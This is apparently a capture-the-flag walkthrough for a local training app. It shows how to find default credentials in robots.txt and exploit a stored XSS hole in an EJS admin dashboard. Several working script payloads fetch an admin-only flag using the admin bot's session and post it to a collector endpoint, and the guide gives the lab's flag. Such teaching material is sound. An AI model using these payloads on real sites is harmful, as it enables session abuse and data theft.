# 🎫 Ticket to the Vault: Complete Walkthrough

> **⚠️ This is an educational walkthrough guide.**
> 
> **Try solving the challenge yourself first!** This guide is meant for:
> - Learning the concepts after attempting the challenge
> - Understanding the technical details
> - Getting unstuck if you're truly stuck
> 
> The challenge is designed to teach discovery and analysis skills. Use this guide responsibly!

## 🎯 Mission Objective
Steal The Professor's master plan (the flag) by exploiting a **Stored XSS** vulnerability in the communication network.

## 📚 Learning Approach

**This guide teaches you HOW to discover and construct the attack, not just copy-paste a solution.**

The challenge is designed to teach:
- **Discovery skills** - Finding vulnerabilities and endpoints
- **Analysis skills** - Understanding how the application works
- **Construction skills** - Building your own payload
- **Problem-solving** - Figuring out each step

**Recommended approach:**
1. Try to discover things yourself using the hints
2. Analyze the application structure
3. Test your understanding with simple payloads
4. Build up to the complete solution
5. Only check the "Complete Solution" section if you're truly stuck

**The guide is structured to:**
- ✅ Guide you through discovery (Steps 1-4)
- ✅ Explain the reasoning behind each step
- ✅ Provide hints if you're stuck
- ✅ Show the complete solution only at the end

## 📋 Step-by-Step Heist Plan

### Step 1: Access The Network
**Objective:** Connect to The Professor's communication network

1. Open your web browser (Chrome, Firefox, or Edge)
2. Navigate to: **http://localhost:5002**
3. You should see the **Ticket to the Vault** homepage with:
   - Red and black Money Heist-themed design
   - "Secure Communication Network" header
   - An **"Enter the Network"** button

**What you'll see:**
- A dramatic red gradient background with scanline effects
- The Money Heist logo/theme
- A login prompt

---

### Step 2: Discover Credentials and Enter as Tokyo
**Objective:** Find gang member credentials and authenticate to access the message system

**First, discover the credentials:**

1. You need to find Tokyo's login credentials
2. The hint says: "Check standard web files that might contain hidden information"
3. Think about common web files that applications expose
4. **Discovery:** Visit `/robots.txt` (a standard file web crawlers check)
5. You'll find credentials in the comments:
   ```
   # CTF Discovery: Default user credentials
   # Tokyo: tokyo / rio123
   # The Professor: admin / admin123
   ```

**Then login:**

1. Click the **"Enter the Network"** button (or navigate to `/auth/login`)
2. You'll see a login form with fields for "Codename" and "Passphrase"
3. Enter Tokyo's credentials (from robots.txt):
   - **Codename:** `tokyo`
   - **Passphrase:** `rio123`
4. Click **"Connect"** or press Enter
5. You'll be redirected to the main dashboard

**What you'll see after login:**
- Welcome message: "Connected as **tokyo**"
- Three action buttons:
  - **"Send Message"** - Create a new message
  - **"Intercepted Data"** - View captured intelligence
  - **"Disconnect"** - Logout button
- A hint section explaining the mission

**Behind the scenes:**
- Your session is created and stored in the database
- You're assigned `user_id: 1` (Tokyo is the first user)
- Your role is set to "user" (not admin)

---

### Step 3: Understand The Vulnerability
**Objective:** Learn how the attack will work

**The Vulnerability:**
- The Professor's dashboard at `/admin/tickets` uses **unescaped output** (`<%- %>`) instead of escaped output (`<%= %>`)
- This means any HTML/JavaScript in your message will be **executed as code**, not displayed as text
- When The Professor views messages, your JavaScript runs in **his browser context** with **his admin session**

**The Attack Vector:**
1. You send a message containing JavaScript
2. The message is stored in the database (as plain text)
3. The Professor-bot automatically visits `/admin/tickets` every **8 seconds**
4. The server renders your message using `<%- %>` (unescaped)
5. The browser sees a `<script>` tag and executes it
6. Your JavaScript runs with The Professor's admin privileges

**Why This Works:**
- Same-origin policy: JavaScript runs on the same domain
- Session cookies are automatically included in requests
- The Professor's browser has valid admin session cookies
- Your script can access admin-only endpoints like `/admin/flag`

---

### Step 4: Discover and Construct Your Payload
**Objective:** Analyze the application to discover endpoints and construct an XSS payload

This step requires **analysis and discovery**. You need to figure out:
1. How to test if XSS works
2. What endpoints are available
3. How to exfiltrate the flag
4. How to construct the payload

---

#### 4.1: Test for XSS Vulnerability

**First, verify that XSS is possible:**

1. Click **"Send Message"**
2. In the **Message** field, try a simple test:
   ```html
   <script>alert('XSS Test')</script>
   ```
3. Submit the message
4. **Note:** You won't see the alert in YOUR browser - it will execute when The Professor views it

**How to verify it worked:**
- The message is stored successfully
- The hint says "The Professor reviews all messages"
- This suggests stored XSS (not reflected)

**Discovery Hint:**
- Check the page source or view hints - look for mentions of "renders messages" or "dashboard"
- The mission brief says: "The Professor reviews all messages in his private dashboard"
- This suggests there's an admin dashboard that displays your messages

---

#### 4.2: Discover Available Endpoints

**You need to find:**
1. Where the flag is stored (admin-only endpoint)
2. How to exfiltrate data (collector endpoint)

**Methods to discover endpoints:**

**A. Check robots.txt:**
- You already found `/robots.txt` for credentials
- It also lists disallowed paths: `/admin`, `/admin/tickets`, `/admin/flag`
- This confirms admin endpoints exist!

**B. Explore the application:**
- Check the navigation links
- Look at the "Intercepted Data" page - what does it show?
- Try accessing common admin paths:
  - `/admin`
  - `/admin/dashboard`
  - `/admin/tickets`
  - `/admin/flag` (common CTF pattern, also mentioned in robots.txt)

**C. Analyze the hints:**
- The mission says "master plan" is in "private dashboard"
- "Intercepted Data" suggests there's a way to capture data
- Look for clues in the UI text

**D. Check browser network tab:**
- Open DevTools (F12) → Network tab
- Navigate around the application
- Look for API calls or endpoints

**Expected Discovery:**
- `/admin/flag` - Admin-only endpoint that returns the flag (hinted in robots.txt)
- `/collector` - Endpoint that accepts POST requests to store captured data
- `/my-captures` - View your captured data

---

#### 4.3: Understand the Exfiltration Method

**Key Questions:**
1. How do you get data from `/admin/flag` to your account?
2. How do you view captured data?

**Discovery Process:**

1. **Check the "Intercepted Data" page:**
   - Visit `/my-captures` (click "Intercepted Data" button)
   - Notice it shows "captures" - this suggests there's a way to store data
   - The page is empty initially - you need to populate it

2. **Look for collector endpoints:**
   - Common names: `/collector`, `/capture`, `/exfil`, `/store`
   - Try common paths or analyze the application structure
   - Look for POST endpoints that accept data

3. **Understand the data format:**
   - If you find `/collector`, what does it expect?
   - Try common formats or analyze error messages
   - Usually: `{ user_id: number, data: string }`

**Discovery Hint:**
- The "Intercepted Data" page shows captures linked to `user_id`
- This suggests the collector needs your `user_id`
- Your `user_id` is likely `1` (first user: Tokyo)

---

#### 4.4: Construct Your Payload

**Now that you've discovered:**
- ✅ XSS works (stored, executes when admin views)
- ✅ `/admin/flag` exists (admin-only endpoint)
- ✅ `/collector` exists (accepts POST with `user_id` and `data`)
- ✅ `/my-captures` shows your captures

**Build the payload step by step:**

**Step 1: Fetch the flag**
```javascript
fetch('/admin/flag')
```
- This makes a request to the admin endpoint
- Will execute with admin's session (same-origin)

**Step 2: Get the response text**
```javascript
.then(r => r.text())
```
- Converts the response to text (the flag string)

**Step 3: Send to collector**
```javascript
.then(flag => {
  fetch('/collector', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ user_id: 1, data: flag })
  });
})
```
- Posts the flag to the collector
- Links it to your `user_id: 1` (Tokyo's ID)

**Complete Payload:**
```html
<script>
fetch('/admin/flag')
  .then(r => r.text())
  .then(flag => {
    fetch('/collector', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ user_id: 1, data: flag })
    });
  });
</script>
```

**Alternative (if you need error handling):**
```html
<script>
(async function() {
  try {
    const response = await fetch('/admin/flag');
    const flag = await response.text();
    await fetch('/collector', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ user_id: 1, data: flag })
    });
  } catch(e) {
    console.error('Error:', e);
  }
})();
</script>
```

---

#### 4.5: Send Your Payload

1. Click **"Send Message"**
2. Fill in the form:
   - **Subject:** `Mission Update` (or anything)
   - **Message:** Paste your constructed payload
3. Click **"Send Message"**
4. You should see: "Message sent. The Professor will review it shortly."

**Important Notes:**
- Replace `user_id: 1` with your actual user ID if needed
- Tokyo is usually `user_id: 1` (first user created)
- If it doesn't work, try `user_id: 2` or check your actual ID
- The payload executes when The Professor views the message (not immediately)

---

### Step 5: Wait for The Professor
**Objective:** Let The Professor-bot review your message and execute the payload

**Timeline:**
- The Professor-bot runs on an **8-second interval**
- It logs in as admin
- Visits `/admin/tickets` to review messages
- Your JavaScript executes in The Professor's browser context

**What happens automatically:**
1. **0-8 seconds:** Bot logs in and navigates to dashboard
2. **8-10 seconds:** Bot views your message, JavaScript executes
3. **10-11 seconds:** Your payload:
   - Fetches `/admin/flag` → Receives `FLAG{THE_BOT_DID_THE_DIRTY_WORK}`
   - Posts to `/collector` → Flag stored in database with your `user_id: 1`
4. **11+ seconds:** Bot continues its cycle

**How to verify it's working:**
- Check browser console (F12) - though you won't see errors (payload runs in bot's browser)
- Wait at least **10-15 seconds** after sending the message
- The bot logs show: `[professor-bot] The Professor reviewed all messages`

**Behind the scenes:**
- The Professor's dashboard renders your message with `<%- t.message %>`
- Browser parses the HTML and finds `<script>` tag
- JavaScript engine executes the script
- Script makes authenticated requests using The Professor's session cookies
- Server sees valid admin session and returns the flag
- Flag is sent to `/collector` and stored in `captures` table

---

### Step 6: Retrieve The Master Plan
**Objective:** View the intercepted flag from The Professor's system

1. **Wait 10-15 seconds** after sending the message (give The Professor time to review it)
2. Click **"Intercepted Data"** in the navigation (or go to `/my-captures`)
3. You should see a page titled **"Intercepted Intelligence"** with:
   - Classification stamps: "INTERCEPTED", "EYES ONLY"
   - A card showing your capture

**What you'll see:**
```
Interception #1
Captured: 2024-12-23T10:30:45.123Z

FLAG{THE_BOT_DID_THE_DIRTY_WORK}
```

**Success Indicators:**
- ✅ You see a capture card with a timestamp
- ✅ The flag `FLAG{THE_BOT_DID_THE_DIRTY_WORK}` is displayed
- ✅ Classification stamps show "CLASSIFIED"

**If you don't see the flag:**
- Wait a bit longer (bot runs every 8 seconds)
- Check that your `user_id` is correct (try 1, 2, etc.)
- Verify the payload syntax is correct
- Check the bot logs: `sudo docker-compose logs admin-bot`

**Note:** The system prevents duplicate flag captures - once you've captured it, subsequent bot visits won't create duplicate entries. Each user can only capture the flag once.

---

## 🎯 Complete Attack Flow Summary

```
You (Tokyo)                    The Professor's Bot              Server
   |                                  |                          |
   |--[1] Send Message with XSS------>|                          |
   |                                  |                          |
   |                                  |--[2] Bot visits /admin/tickets-->|
   |                                  |                          |
   |                                  |<--[3] Server renders message with <%- %>--|
   |                                  |                          |
   |                                  |--[4] JavaScript executes in bot's browser--|
   |                                  |                          |
   |                                  |--[5] fetch('/admin/flag')-->|
   |                                  |<--[6] Returns FLAG{...}--|
   |                                  |                          |
   |                                  |--[7] POST to /collector-->|
   |                                  |                          |
   |                                  |<--[8] Stores flag in DB--|
   |                                  |                          |
   |--[9] Visit /my-captures-------->|                          |
   |<--[10] See captured flag-------|                          |
```

**Total time:** ~10-15 seconds from message submission to flag capture

## 🔍 Discovery Hints (If You're Stuck)

### Finding Credentials
- **Hint 1:** Check standard web files that applications expose
- **Hint 2:** Think about files that web crawlers and bots check
- **Hint 3:** Common file: `robots.txt`
- **Try:** Visit `/robots.txt` to find credentials in comments

### Finding the Flag Endpoint
- **Hint 1:** The mission mentions "master plan" in "private dashboard"
- **Hint 2:** Admin endpoints often follow patterns like `/admin/*`
- **Hint 3:** CTF flags are commonly at `/admin/flag` or `/flag`
- **Try:** Access `/admin/flag` directly (you'll get 403, but confirms it exists)

### Finding the Collector Endpoint
- **Hint 1:** The "Intercepted Data" page shows captures - how does data get there?
- **Hint 2:** Look for POST endpoints that accept data
- **Hint 3:** Common names: `/collector`, `/capture`, `/exfil`
- **Try:** Test common endpoint names or analyze application behavior

### Determining Your User ID
- **Hint 1:** You're the first user created (Tokyo)
- **Hint 2:** User IDs usually start at 1
- **Hint 3:** Test with a simple payload first:
  ```html
  <script>
  fetch('/collector', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ user_id: 1, data: 'test' })
  });
  </script>
  ```
- **Then check:** `/my-captures` to see if "test" appears

### Verifying XSS Works
- **Test payload:**
  ```html
  <script>alert('XSS')</script>
  ```
- **Note:** You won't see the alert - it executes when admin views it
- **Verify:** Message is stored successfully (no errors)

---

## 💡 Complete Solution (If You Need It)

If you've tried discovery but need the complete payload, here it is:

### Main Payload
```html
<script>
fetch('/admin/flag')
  .then(r => r.text())
  .then(flag => {
    fetch('/collector', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ user_id: 1, data: flag })
    });
  });
</script>
```

### Alternative Payloads

If the first payload doesn't work, try these variations:

### Payload 2 (More verbose):
```html
<script>
(async function() {
  try {
    const response = await fetch('/admin/flag');
    const flag = await response.text();
    await fetch('/collector', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ user_id: 1, data: flag })
    });
  } catch(e) {
    console.error('Error:', e);
  }
})();
</script>
```

### Payload 3 (With error handling):
```html
<script>
fetch('/admin/flag')
  .then(r => r.text())
  .then(flag => {
    return fetch('/collector', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ user_id: 1, data: 'FLAG: ' + flag })
    });
  })
  .then(() => console.log('Flag captured!'))
  .catch(e => console.error('Error:', e));
</script>
```

## Troubleshooting

### If you don't see the flag:
1. **Check user_id:** The user_id might not be 1. Try 2, 3, etc.
2. **Wait longer:** The bot runs every 8 seconds, give it time
3. **Check browser console:** Open DevTools (F12) to see if there are errors
4. **Verify the payload:** Make sure the JavaScript syntax is correct
5. **Check admin bot logs:**
   ```bash
   sudo docker-compose logs admin-bot
   ```

### To find your user_id:
You can add this to your payload to capture your user info:
```html
<script>
fetch('/collector', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ user_id: 1, data: 'Testing user_id: 1' })
});
</script>
```

## 🔍 How The Heist Works (Technical Details)

1. **Stored XSS:** The vulnerability is in `views/admin_tickets.ejs` line 25:
   ```ejs
   <div class="ticket-body"><%- t.message %></div>
   ```
   The `<%- %>` tag outputs unescaped HTML, allowing script execution when The Professor views messages.

2. **Same-Origin Attack:** The JavaScript runs in The Professor's browser with his session cookies, so it can access his private endpoints like `/admin/flag` (where the master plan is stored).

3. **Exfiltration:** The `/collector` endpoint accepts POST requests with `user_id` and `data`, storing intercepted intelligence in the database.

4. **Intelligence Retrieval:** The `/my-captures` endpoint shows all data intercepted for your user_id.

## Expected Result

When successful, you'll see:
```
FLAG{THE_BOT_DID_THE_DIRTY_WORK}
```

This is The Professor's master plan that you've successfully intercepted!

## Learning Points

- **Always escape user input** in templates (use `<%= %>` instead of `<%- %>`)
- **Stored XSS** is dangerous because it persists and affects anyone who views the content
- **Admin interfaces** are high-value targets for XSS attacks
- **Same-origin requests** can access authenticated resources automatically
- **Content Security Policy (CSP)** would prevent this attack in production

Good luck! 🎭💰

